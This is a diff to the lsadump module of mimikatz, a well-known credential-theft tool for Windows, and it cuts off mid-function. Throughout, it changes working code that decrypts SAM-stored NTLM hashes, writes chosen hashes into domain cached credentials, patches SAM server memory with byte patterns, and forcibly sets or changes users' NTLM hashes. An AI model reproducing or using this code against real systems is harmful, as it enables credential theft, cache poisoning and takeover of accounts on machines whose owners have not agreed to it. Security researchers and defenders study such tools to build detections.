@@ -103,7 +103,6 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 	PKULL_M_REGISTRY_HANDLE hSystem, hSecurity;
 	HKEY hSystemBase, hSecurityBase;
 	BYTE sysKey[SYSKEY_LENGTH];
-	BOOL hashStatus = FALSE;
 	LPCWSTR szSystem = NULL, szSecurity = NULL, szHash, szPassword, szSubject;
 	UNICODE_STRING uPassword;
 	KUHL_LSADUMP_DCC_CACHE_DATA cacheData = {0};
@@ -118,26 +117,40 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 		{
 			kprintf(L"> User cache replace mode !\n");
 			kprintf(L"  * user     : %s\n", cacheData.username);
-			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szHash, NULL))
+			
+			if(kull_m_string_args_byName(argc, argv, L"dcc", &szHash, NULL))
 			{
-				hashStatus = kull_m_string_stringToHex(szHash, cacheData.ntlm, LM_NTLM_HASH_LENGTH);
-				if(!hashStatus)
-					PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes) - will use default password...\n");
+				if(cacheData.isDCC = kull_m_string_stringToHex(szHash, cacheData.dcc, LM_NTLM_HASH_LENGTH))
+				{
+					kprintf(L"  * dccX     : ");
+					kull_m_string_wprintf_hex(cacheData.dcc, LM_NTLM_HASH_LENGTH, 0);
+					kprintf(L"\n");
+				}
+				else PRINT_ERROR(L"DCC hash length must be 32 (16 bytes) - will use default password...\n");
 			}
-			if(!hashStatus)
+			else
 			{
-				kull_m_string_args_byName(argc, argv, L"password", &szPassword, MIMIKATZ);
-				kprintf(L"  * password : %s\n", szPassword);
-				RtlInitUnicodeString(&uPassword, szPassword);
-				hashStatus = NT_SUCCESS(RtlDigestNTLM(&uPassword, cacheData.ntlm));
+				if(kull_m_string_args_byName(argc, argv, L"ntlm", &szHash, NULL))
+				{
+					cacheData.isNtlm = kull_m_string_stringToHex(szHash, cacheData.ntlm, LM_NTLM_HASH_LENGTH);
+					if(!cacheData.isNtlm)
+						PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes) - will use default password...\n");
+				}
+				if(!cacheData.isNtlm)
+				{
+					kull_m_string_args_byName(argc, argv, L"password", &szPassword, MIMIKATZ);
+					kprintf(L"  * password : %s\n", szPassword);
+					RtlInitUnicodeString(&uPassword, szPassword);
+					cacheData.isNtlm = NT_SUCCESS(RtlDigestNTLM(&uPassword, cacheData.ntlm));
+				}
+				if(cacheData.isNtlm)
+				{
+					kprintf(L"  * ntlm     : ");
+					kull_m_string_wprintf_hex(cacheData.ntlm, LM_NTLM_HASH_LENGTH, 0);
+					kprintf(L"\n");
+				}
+				else cacheData.username = NULL;
 			}
-			if(hashStatus)
-			{
-				kprintf(L"  * ntlm     : ");
-				kull_m_string_wprintf_hex(cacheData.ntlm, LM_NTLM_HASH_LENGTH, 0);
-				kprintf(L"\n");
-			}
-			else cacheData.username = NULL;
 			kprintf(L"\n");
 		}
 		else if(kull_m_string_args_byName(argc, argv, L"subject", &szSubject, NULL))
@@ -399,62 +412,43 @@ BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE 
 	
 	if(pSamHash->offset)
 	{
-		//if(pSamHash->lenght == LM_NTLM_HASH_LENGTH)
-		//{
-		//	MD5Init(&md5ctx);
-		//	MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
-		//	MD5Update(&md5ctx, &rid, sizeof(DWORD));
-		//	MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
-		//	MD5Final(&md5ctx);
-		//	cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
-		//	if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
-		//	{
-		//		RtlCopyMemory(cypheredHashBuffer.Buffer, pHash, cypheredHashBuffer.Length);
-		//		if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
-		//			PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
-		//	}
-		//}
-		//else
+		switch(pHash->Revision)
 		{
-
-			switch(pHash->Revision)
+		case 1:
+			if(pSamHash->lenght >= sizeof(SAM_HASH))
 			{
-			case 1:
-				if(pSamHash->lenght >= sizeof(SAM_HASH))
+				MD5Init(&md5ctx);
+				MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
+				MD5Update(&md5ctx, &rid, sizeof(DWORD));
+				MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
+				MD5Final(&md5ctx);
+				cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
+				if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
 				{
-					MD5Init(&md5ctx);
-					MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
-					MD5Update(&md5ctx, &rid, sizeof(DWORD));
-					MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
-					MD5Final(&md5ctx);
-					cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
+					RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
+					if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
+						PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
+				}
+			}
+			break;
+		case 2:
+			pHashAes = (PSAM_HASH_AES) pHash;
+			if(pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
+			{
+				if(kull_m_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
+				{
+					cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
 					if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
 					{
-						RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
-						if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
-							PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
+						RtlCopyMemory(cypheredHashBuffer.Buffer, out, len);
+						status = TRUE;
 					}
+					LocalFree(out);
 				}
-				break;
-			case 2:
-				pHashAes = (PSAM_HASH_AES) pHash;
-				if(pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
-				{
-					if(kull_m_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
-					{
-						cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
-						if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
-						{
-							RtlCopyMemory(cypheredHashBuffer.Buffer, out, len);
-							status = TRUE;
-						}
-						LocalFree(out);
-					}
-				}
-				break;
-			default:
-				PRINT_ERROR(L"Unknow SAM_HASH revision (%hu)\n", pHash->Revision);
 			}
+			break;
+		default:
+			PRINT_ERROR(L"Unknow SAM_HASH revision (%hu)\n", pHash->Revision);
 		}
 		if(status)
 			kuhl_m_lsadump_dcsync_decrypt(cypheredHashBuffer.Buffer, cypheredHashBuffer.Length, rid, isNtlm ? (isHistory ? L"ntlm" : L"NTLM" ) : (isHistory ? L"lm  " : L"LM  "), isHistory);
@@ -705,7 +699,7 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 
 BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN HKEY hSecurityBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData)
 {
-	BOOL status = FALSE;
+	BOOL status = FALSE, hashStatus;
 	HKEY hCache;
 	DWORD i, iter = 10240, szNLKM, type, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szSecret, szNeeded, s1;
 	PVOID pNLKM;
@@ -769,7 +763,15 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 										if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
 										{
 											kprintf(L"> User cache replace mode (2)!\n");
-											if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, iter)))
+											if(pCacheData->isNtlm)
+												hashStatus = NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, iter));
+											else if(pCacheData->isDCC)
+											{
+												hashStatus = TRUE;
+												RtlCopyMemory(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->dcc, LM_NTLM_HASH_LENGTH);
+											}
+											else hashStatus = FALSE;
+											if(hashStatus)
 											{
 												kprintf(L"  MsCacheV2 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
 												if(kull_m_crypto_hmac(CALG_SHA1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
@@ -783,6 +785,7 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 													}
 												}
 											}
+											else PRINT_ERROR_AUTO(L"?");
 										}
 									}
 								}
@@ -801,6 +804,14 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 											if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
 											{
 												kprintf(L"> User cache replace mode (1)!\n");
+												if(pCacheData->isNtlm)
+													hashStatus = NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, 0));
+												else if(pCacheData->isDCC)
+												{
+													hashStatus = TRUE;
+													RtlCopyMemory(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->dcc, LM_NTLM_HASH_LENGTH);
+												}
+												else hashStatus = FALSE;
 												if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, 0)))
 												{
 													kprintf(L"  MsCacheV1 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
@@ -1201,7 +1212,7 @@ BOOL kuhl_m_lsadump_sec_aes256(PNT6_HARD_SECRET hardSecretBlob, DWORD hardSecret
 	return status;
 }
 
-#ifdef _M_X64
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0x49, 0x8d, 0x41, 0x20};
 BYTE PATC_WIN5_NopNop[]								= {0x90, 0x90};
 BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
@@ -1214,7 +1225,7 @@ KULL_M_PATCH_GENERIC SamSrvReferences[] = {
 	{KULL_M_WIN_BUILD_10_1709,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
 	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-24}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0xc6, 0x40, 0x22, 0x00, 0x8b};
 BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
 KULL_M_PATCH_GENERIC SamSrvReferences[] = {
@@ -1630,12 +1641,12 @@ void kuhl_m_lsadump_trust_authinformation(PLSA_AUTH_INFORMATION info, DWORD coun
 }
 
 BYTE PATC_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xeb};
-#ifdef _M_X64
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xbb, 0x03, 0x00, 0x00, 0xc0, 0xe9};
 KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-11}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xc7, 0x45, 0xfc, 0x03, 0x00, 0x00, 0xc0, 0xe9};
 KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-10}},
@@ -2049,239 +2060,224 @@ void kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator(PNETLOGON_CREDENTIAL Cr
 	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
 	yes, again him... he loves LSA too ;)
 */
-DECLARE_CONST_UNICODE_STRING(uBuiltin, L"Builtin");
+NTSTATUS CALLBACK kuhl_m_lsadump_setntlm_callback(SAMPR_HANDLE hUser, PVOID pvArg)
+{
+	NTSTATUS status = SamSetInformationUser(hUser, UserInternal1Information, (PSAMPR_USER_INFO_BUFFER) pvArg);
+	if(NT_SUCCESS(status))
+		kprintf(L"\n>> Informations are in the target SAM!\n");
+	else PRINT_ERROR(L"SamSetInformationUser: %08x\n", status);
+	return status;
+}
+
 NTSTATUS kuhl_m_lsadump_setntlm(int argc, wchar_t * argv[])
 {
-	NTSTATUS status, enumDomainStatus;
-	LSA_UNICODE_STRING serverName, userName, password;
-	SAMPR_HANDLE hServerHandle, hDomainHandle, hUserHandle;
-	DWORD i, domainEnumerationContext = 0, domainCountRetourned, *pRid = NULL, *pUse = NULL;
-	PSAMPR_RID_ENUMERATION pEnumDomainBuffer;
-	PSID domainSid;
-	PCWCHAR szUser, szServer = NULL, szPassword;
+	NTSTATUS status;
+	LSA_UNICODE_STRING password;
+	PCWCHAR szPassword;
 	SAMPR_USER_INFO_BUFFER infos = {{{0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6}, {0x7c, 0x1c, 0x15, 0xe8, 0x74, 0x11, 0xfb, 0xa2, 0x1d, 0x91, 0xa0, 0x81, 0xd4, 0xb3, 0x78, 0x61}, TRUE, FALSE, FALSE, FALSE,}};
 
-	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
+	if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
 	{
-		RtlInitUnicodeString(&userName, szUser);
-		kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL);
-		RtlInitUnicodeString(&serverName, szServer ? szServer : L"");
-		kprintf(L"Target server: %wZ\n", &serverName);
-		kprintf(L"Target user  : %wZ\n", &userName);
-		if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
-		{
-			RtlInitUnicodeString(&password, szPassword);
-			status = RtlDigestNTLM(&password, infos.Internal1.NTHash);
-			if(!NT_SUCCESS(status))
-				PRINT_ERROR(L"Unable to digest NTLM hash from password: %08x\n", status);
-		}
-		else if(kull_m_string_args_byName(argc, argv, L"ntlm", &szPassword, NULL))
-		{
-			status = kull_m_string_stringToHex(szPassword, infos.Internal1.NTHash, sizeof(infos.Internal1.NTHash)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
-			if(!NT_SUCCESS(status))
-				PRINT_ERROR(L"Unable to convert \'%s\' to NTLM hash (16 bytes)\n", szPassword);
-		}
-		else
-		{
-			kprintf(L"** No credentials provided, will use the default one **\n");
-			infos.Internal1.LmPasswordPresent = TRUE;
-			status = STATUS_SUCCESS;
-		}
-
-		if(NT_SUCCESS(status))
-		{
-			kprintf(L"NTLM         : ");
-			kull_m_string_wprintf_hex(infos.Internal1.NTHash, sizeof(infos.Internal1.NTHash), 0);
-			kprintf(L"\n\n");
-			status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
-			if(NT_SUCCESS(status))
-			{
-				do
-				{
-					enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
-					if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
-					{
-						for(i = 0; i < domainCountRetourned; i++)
-						{
-							if(RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &uBuiltin, TRUE))
-								continue;
-							kprintf(L"Domain name  : %wZ\n", &pEnumDomainBuffer[i].Name);
-							status = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
-							if(NT_SUCCESS(status))
-							{
-								kprintf(L"Domain SID   : ");
-								kull_m_string_displaySID(domainSid);
-								kprintf(L"\n");
-								status = SamOpenDomain(hServerHandle, DOMAIN_LOOKUP, domainSid, &hDomainHandle);
-								if(NT_SUCCESS(status))
-								{
-									status = SamLookupNamesInDomain(hDomainHandle, 1, &userName, &pRid, &pUse);
-									if(NT_SUCCESS(status))
-									{
-										kprintf(L"User RID     : %u\n", pRid[0]);
-										status = SamOpenUser(hDomainHandle, USER_FORCE_PASSWORD_CHANGE, pRid[0], &hUserHandle);
-										if(NT_SUCCESS(status))
-										{
-											status = SamSetInformationUser(hUserHandle, UserInternal1Information, &infos);
-											if(NT_SUCCESS(status))
-												kprintf(L"\n>> Informations are in the target SAM!\n");
-											else PRINT_ERROR(L"SamSetInformationUser: %08x\n", status);
-											SamCloseHandle(hUserHandle);
-										}
-										else PRINT_ERROR(L"SamOpenUser: %08x\n", status);
-										SamFreeMemory(pRid);
-										SamFreeMemory(pUse);
-									}
-									else PRINT_ERROR(L"SamLookupNamesInDomain: %08x\n", status);
-									SamCloseHandle(hDomainHandle);
-								}
-								else PRINT_ERROR(L"SamOpenDomain: %08x\n", status);
-								SamFreeMemory(domainSid);
-							}
-							else PRINT_ERROR(L"SamLookupDomainInSamServer: %08x\n", status);
-						}
-						SamFreeMemory(pEnumDomainBuffer);
-					}
-					else PRINT_ERROR(L"SamEnumerateDomainsInSamServer: %08x\n", enumDomainStatus);
-				}
-				while(enumDomainStatus == STATUS_MORE_ENTRIES);
-				SamCloseHandle(hServerHandle);
-			}
-			else PRINT_ERROR(L"SamConnect: %08x\n", status);
-		}
+		RtlInitUnicodeString(&password, szPassword);
+		status = RtlDigestNTLM(&password, infos.Internal1.NTHash);
+		if(!NT_SUCCESS(status))
+			PRINT_ERROR(L"Unable to digest NTLM hash from password: %08x\n", status);
 	}
-	else PRINT_ERROR(L"Argument /user: is needed\n");
+	else if(kull_m_string_args_byName(argc, argv, L"ntlm", &szPassword, NULL))
+	{
+		status = kull_m_string_stringToHex(szPassword, infos.Internal1.NTHash, sizeof(infos.Internal1.NTHash)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
+		if(!NT_SUCCESS(status))
+			PRINT_ERROR(L"Unable to convert \'%s\' to NTLM hash (16 bytes)\n", szPassword);
+	}
+	else
+	{
+		kprintf(L"** No credentials provided, will use the default one **\n");
+		infos.Internal1.LmPasswordPresent = TRUE;
+		status = STATUS_SUCCESS;
+	}
+
+	if(NT_SUCCESS(status))
+	{
+		kprintf(L"NTLM         : ");
+		kull_m_string_wprintf_hex(infos.Internal1.NTHash, sizeof(infos.Internal1.NTHash), 0);
+		kprintf(L"\n\n");
+		status = kuhl_m_lsadump_enumdomains_users(argc, argv, USER_FORCE_PASSWORD_CHANGE, kuhl_m_lsadump_setntlm_callback, &infos);
+	}
 	return STATUS_SUCCESS;
 }
 
 /*	This function `changentlm` is based on another crazy idea of
 	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
 */
+NTSTATUS CALLBACK kuhl_m_lsadump_changentlm_callback(SAMPR_HANDLE hUser, PVOID pvArg)
+{
+	PKUHL_M_LSADUMP_CHANGENTLM_DATA data = (PKUHL_M_LSADUMP_CHANGENTLM_DATA) pvArg;
+	NTSTATUS status = SamiChangePasswordUser(hUser, data->isOldLM, data->oldLM, data->newLM, data->isNewNTLM, data->oldNTLM, data->newNTLM);
+	if(NT_SUCCESS(status))
+		kprintf(L"\n>> Change password is a success!\n");
+	else if(status == STATUS_WRONG_PASSWORD)
+		PRINT_ERROR(L"Bad old NTLM hash or password!\n");
+	else if(status == STATUS_PASSWORD_RESTRICTION)
+		PRINT_ERROR(L"Bad new NTLM hash or password! (restriction)\n");
+	else PRINT_ERROR(L"SamiChangePasswordUser: %08x\n", status);
+	return status;
+}
+
 NTSTATUS kuhl_m_lsadump_changentlm(int argc, wchar_t * argv[])
 {
 	NTSTATUS status0 = STATUS_DATA_ERROR, status1 = STATUS_DATA_ERROR;
-	LSA_UNICODE_STRING serverName, userName, password;
-	SAMPR_HANDLE hServerHandle, hDomainHandle, hUserHandle;
-	DWORD i, domainEnumerationContext = 0, domainCountRetourned, *pRid = NULL, *pUse = NULL;
+	LSA_UNICODE_STRING password;
+	PCWCHAR szPassword;
+	KUHL_M_LSADUMP_CHANGENTLM_DATA infos = {FALSE, {0}, {0}, TRUE, {0}, {0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6}};
+
+	if(kull_m_string_args_byName(argc, argv, L"oldpassword", &szPassword, NULL))
+	{
+		RtlInitUnicodeString(&password, szPassword);
+		status0 = RtlDigestNTLM(&password, infos.oldNTLM);
+		if(!NT_SUCCESS(status0))
+			PRINT_ERROR(L"Unable to digest NTLM hash from old password: %08x\n", status0);
+	}
+	else if(kull_m_string_args_byName(argc, argv, L"oldntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"old", &szPassword, NULL))
+	{
+		status0 = kull_m_string_stringToHex(szPassword, infos.oldNTLM, sizeof(infos.oldNTLM)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
+		if(!NT_SUCCESS(status0))
+			PRINT_ERROR(L"Unable to convert \'%s\' to old NTLM hash (16 bytes)\n", szPassword);
+	}
+	else PRINT_ERROR(L"Argument /oldpassword: or /oldntlm: is needed\n");
+
+	if(kull_m_string_args_byName(argc, argv, L"newpassword", &szPassword, NULL))
+	{
+		RtlInitUnicodeString(&password, szPassword);
+		status1 = RtlDigestNTLM(&password, infos.newNTLM);
+		if(!NT_SUCCESS(status1))
+			PRINT_ERROR(L"Unable to digest NTLM hash from new password: %08x\n", status1);
+	}
+	else if(kull_m_string_args_byName(argc, argv, L"newntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"new", &szPassword, NULL))
+	{
+		status1 = kull_m_string_stringToHex(szPassword, infos.newNTLM, sizeof(infos.newNTLM)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
+		if(!NT_SUCCESS(status1))
+			PRINT_ERROR(L"Unable to convert \'%s\' to new NTLM hash (16 bytes)\n", szPassword);
+	}
+	else
+	{
+		kprintf(L"** No new credentials provided, will use the default one **\n");
+		status1 = STATUS_SUCCESS;
+	}
+
+	if(NT_SUCCESS(status0) && NT_SUCCESS(status1))
+	{
+		kprintf(L"OLD NTLM     : ");
+		kull_m_string_wprintf_hex(infos.oldNTLM, sizeof(infos.oldNTLM), 0);
+		kprintf(L"\nNEW NTLM     : ");
+		kull_m_string_wprintf_hex(infos.newNTLM, sizeof(infos.newNTLM), 0);
+		kprintf(L"\n\n");
+		status0 = kuhl_m_lsadump_enumdomains_users(argc, argv, USER_CHANGE_PASSWORD, kuhl_m_lsadump_changentlm_callback, &infos);
+	}
+	return STATUS_SUCCESS;
+}
+
+DECLARE_CONST_UNICODE_STRING(uBuiltin, L"Builtin");
+NTSTATUS kuhl_m_lsadump_enumdomains_users(int argc, wchar_t * argv[], DWORD dwUserAccess, PKUHL_M_LSADUMP_DOMAINUSER callback, PVOID pvArg)
+{
+	NTSTATUS status = STATUS_INVALID_ACCOUNT_NAME, enumDomainStatus;
+	LSA_UNICODE_STRING serverName, userName;
+	PCWCHAR szServer, szUser;
+	BOOL isUser = FALSE, isRid = FALSE;
+	DWORD i, domainEnumerationContext = 0, domainCountRetourned, rid = 0, *pRid, *pUse;
 	PSAMPR_RID_ENUMERATION pEnumDomainBuffer;
 	PSID domainSid;
-	PCWCHAR szUser, szServer = NULL, szPassword;
-	BYTE oldNtlm[LM_NTLM_HASH_LENGTH], newNtlm[LM_NTLM_HASH_LENGTH] = {0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6}, emptyLM[LM_NTLM_HASH_LENGTH] = {0};
+	SAMPR_HANDLE hServerHandle, hDomainHandle, hUserHandle;
 
-	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
+	kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL);
+	RtlInitUnicodeString(&serverName, szServer ? szServer : L"");
+	kprintf(L"Target server: %wZ\n", &serverName);
+	if(isUser = kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 	{
 		RtlInitUnicodeString(&userName, szUser);
-		kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL);
-		RtlInitUnicodeString(&serverName, szServer ? szServer : L"");
-		kprintf(L"Target server: %wZ\n", &serverName);
 		kprintf(L"Target user  : %wZ\n", &userName);
-		
-		
-		if(kull_m_string_args_byName(argc, argv, L"oldpassword", &szPassword, NULL))
-		{
-			RtlInitUnicodeString(&password, szPassword);
-			status0 = RtlDigestNTLM(&password, oldNtlm);
-			if(!NT_SUCCESS(status0))
-				PRINT_ERROR(L"Unable to digest NTLM hash from old password: %08x\n", status0);
-		}
-		else if(kull_m_string_args_byName(argc, argv, L"oldntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"old", &szPassword, NULL))
-		{
-			status0 = kull_m_string_stringToHex(szPassword, oldNtlm, sizeof(oldNtlm)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
-			if(!NT_SUCCESS(status0))
-				PRINT_ERROR(L"Unable to convert \'%s\' to old NTLM hash (16 bytes)\n", szPassword);
-		}
-		else PRINT_ERROR(L"Argument /oldpassword: or /oldntlm: is needed\n");
-
-
-		if(kull_m_string_args_byName(argc, argv, L"newpassword", &szPassword, NULL))
-		{
-			RtlInitUnicodeString(&password, szPassword);
-			status1 = RtlDigestNTLM(&password, newNtlm);
-			if(!NT_SUCCESS(status1))
-				PRINT_ERROR(L"Unable to digest NTLM hash from new password: %08x\n", status0);
-		}
-		else if(kull_m_string_args_byName(argc, argv, L"newntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"new", &szPassword, NULL))
-		{
